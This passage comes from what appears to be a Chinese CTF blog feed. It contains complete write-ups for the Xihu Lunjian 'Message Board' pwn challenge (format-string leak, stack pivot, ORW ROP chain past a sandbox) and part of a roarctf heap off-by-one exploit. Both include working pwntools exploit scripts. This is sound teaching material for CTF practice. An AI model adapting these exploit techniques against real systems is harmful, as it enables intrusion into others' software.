href="https://pic.imgdb.cn/item/63dd2e264757feff33ba8bb9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dd2e264757feff33ba8bb9.png"></a></p><p>总结一下 house of force适用于</p><p>有堆溢出 没有对申请chunk的大小做过多限制 可以获取top chunk地址低地址处的任意写的机会</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022西湖论剑初赛pwn-Message Board</title>
      <link href="/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/"/>
      <url>/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>第一次在大型比赛中拿分 蛮开心的 记录一下</p><p>checksec看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/xihu2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3ff000)</span><br><span class="line">    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;</span><br></pre></td></tr></table></figure><p>顺便用xclibc改一下libc文件 方便我们本地动态调试(这题调试十分重要)</p><p>ida分析一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">176</span>]; <span class="comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401236(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_4040AC )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    dword_4040AC = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">  <span class="built_in">printf</span>(v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v7, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Posted Successfully~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_401236函数清空了缓存区 顺便开了沙箱</p><p><a href="https://pic.imgdb.cn/item/63db6383ac6ef86016604757.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63db6383ac6ef86016604757.png"></a></p><p>onegadget和system(“&#x2F;bin&#x2F;sh”)用不了了</p><p>接着往下分析</p><p>对dword_4040AC进行了if判断 如果为0就进入分支 分支最后将其值设置为1 应该是为了防止修改返回地址为main函数 从而反复利用格式化字符串漏洞</p><p>拥有一次向buf写入0x8字节的机会</p><p>随后将buf的内容通过strcat函数和dest字符串拼接 赋值给了v3 随后printf(v3)存在格式化字符串漏洞</p><p>接着拥有一次栈溢出的机会 但是溢出字节数只有0x10 只够我们覆盖ret addr</p><p>由于开启了沙盒 所以这里只能用栈迁移了 往栈上写入rop链 那么需要泄露栈地址和libc基址</p><p>那就通过格式化字符串漏洞泄露栈地址</p><p>gdb动调看一下偏移</p><p><a href="https://pic.imgdb.cn/item/63dc9e5307d5ca72066c3ab5.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dc9e5307d5ca72066c3ab5.png"></a></p><p>位于rsp+0x70处存放着栈上的地址 那么偏移为6+0x70&#x2F;8 &#x3D; 20</p><p>泄露出来了也还没有结束 我们需要计算一下我们接下来栈溢出的变量v7在栈上的地址</p><p><a href="https://pic.imgdb.cn/item/63dc9f4207d5ca72066da23b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dc9f4207d5ca72066da23b.png"></a></p><p>当前程序中我输入的v7值为aaaaaaaa  而我们泄露出来的栈地址为0x7fffffffdef0</p><p>二者地址差值为0xd0 所以v7_addr &#x3D; stack_addr - 0xd0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%20$p&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">v7_addr = stack_addr -<span class="number">0xd0</span></span><br></pre></td></tr></table></figure><p>接下来就是构造rop链 由于开启了沙盒禁用了execve 所以我们这里用orw的方法泄露flag</p><p>但是还需要用到pop rsi pop rdx指令 显然动态链接的情况下 二进制文件中是没有这两条指令的</p><p>所以我们还需要泄露libc基址 去libc文件中找到这两条指令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x401413</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">back_addr = <span class="number">0x4012e3</span></span><br><span class="line">puts_plt = <span class="number">0x4010e0</span></span><br><span class="line">leave_addr = <span class="number">0x4012e1</span></span><br><span class="line">bss_addr = <span class="number">0x4040B0</span>+<span class="number">0x50</span></span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(v7_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - (<span class="number">0x7f5551189951</span>-<span class="number">0x7f55510f9000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>但是这里泄露libc基址的时候 并非泄露出来的是我预想中的puts_addr</p><p>而是_IO_do_write+177的地址 不过照样能得到libc基址就行了</p><p>接下来就是简单的构造orw链 但是由于main函数一系列的入栈出栈操作 rsp指针的指向并不会跟我们泄露libc基址时一样</p><p>所以我们还需要进行一次动态调试 找到我们第二次写入rop链时的栈地址</p><p>调试exp: 虽然该exp的orw链偏移是调试后的正确结果 但是未调试时的orw链同样也可以 只是为了找到第二次写入v7的rsp指针地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%20$p&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">v7_addr = stack_addr -<span class="number">0xd0</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x401413</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">back_addr = <span class="number">0x4012e3</span></span><br><span class="line">puts_plt = <span class="number">0x4010e0</span></span><br><span class="line">leave_addr = <span class="number">0x4012e1</span></span><br><span class="line">bss_addr = <span class="number">0x4040B0</span>+<span class="number">0x50</span></span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(v7_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - (<span class="number">0x7f5551189951</span>-<span class="number">0x7f55510f9000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2601f</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x142c92</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(stack_addr-<span class="number">0x170</span>)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x170</span>)+p64(leave_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4013A3&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>利用set $rsp &#x3D; $rsp - 0x30 来不断的抬高栈帧 我们可以找到我们写入的rop链</p><p><a href="https://pic.imgdb.cn/item/63dca91407d5ca720680133d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dca91407d5ca720680133d.png"></a></p><p>于是偏移就是当前程序运行泄露的stack_addr - 0x7ffc8bf40650 &#x3D; 0x170</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(stack_addr-<span class="number">0x170</span>)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x170</span>)+p64(leave_addr)</span><br></pre></td></tr></table></figure><p>还有一点就是注意最后栈迁移的地址是rop链的起始地址减去一个字长</p><p>而stack_addr - 0x170是&#x2F;flag字符串的地址 所以实际上rop链的起始地址是stack_addr - 0x168 </p><p>所以覆盖old_rbp的地址应为stack_addr - 0x170</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;tcp.cloud.dasctf.com&quot;,22472)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./xihu2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%20$p&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">v7_addr = stack_addr -<span class="number">0xd0</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x401413</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">back_addr = <span class="number">0x4012e3</span></span><br><span class="line">puts_plt = <span class="number">0x4010e0</span></span><br><span class="line">leave_addr = <span class="number">0x4012e1</span></span><br><span class="line">bss_addr = <span class="number">0x4040B0</span>+<span class="number">0x50</span></span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(back_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(v7_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - (<span class="number">0x7f5551189951</span>-<span class="number">0x7f55510f9000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Now, please say something to DASCTF:&quot;</span>)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x2601f</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x142c92</span></span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(rdi_addr)+p64(stack_addr-<span class="number">0x170</span>)+p64(rsi_addr)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">3</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">payload += p64(rdi_addr)+p64(bss_addr)+p64(puts_plt)</span><br><span class="line">payload = payload.ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack_addr-<span class="number">0x170</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>roarctf_2019_easy_pwn</title>
      <link href="/2023/01/29/roarctf-2019-easy-pwn/"/>
      <url>/2023/01/29/roarctf-2019-easy-pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说</p><p>checksec看一下 保护机制全开</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida看一下伪代码</p><p>main函数很常规 就基于菜单题实现的堆</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_AD0(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = recv_data(v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Tell me the secret about you!!&quot;</span>);</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong try again!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点抓edit函数和delete函数出来说 另外这题创建chunk用的是calloc函数 创建chunk的时候会清空chunk内容 使其为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_E82</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = recv_data(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(&amp;chunk_judge + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      v2 = recv_data(<span class="number">1</span>);</span><br><span class="line">      v4 = compare(*(&amp;chunk_size + <span class="number">4</span> * v3), v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        v2 = recv_data2(chunk_point[<span class="number">2</span> * v3], v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据输入的index来索引bss段数组 如果该index有对应的chunk(即chunk_judge判断成功) 则输入size</p><p>在edit函数输入的size和create chunk时输入的size二者作为compare函数的参数 跟进看一下用来干什么</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E26</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当edit_size-create_size&#x3D;10时 可以供我们多输入一个字节 那么利用四舍五入的机制 就可以做到溢出9个字节</p><p>delete函数:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_F8E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v0 = recv_data(v3);</span><br><span class="line">  v4 = v0;</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0LL</span> &amp;&amp; v0 &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;chunk_judge + <span class="number">4</span> * v0);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;chunk_judge + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      *(&amp;chunk_size + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(chunk_point[<span class="number">2</span> * v0]);</span><br><span class="line">      chunk_point[<span class="number">2</span> * v2] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针置零了 不存在uaf漏洞</p><p>那么合计一下思路 可以利用覆写chunk size来合并chunk 从而获得free_chunk的指针 这样就可以泄露main_arena的真实地址 从而计算处真实地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,28013)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu16_64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span 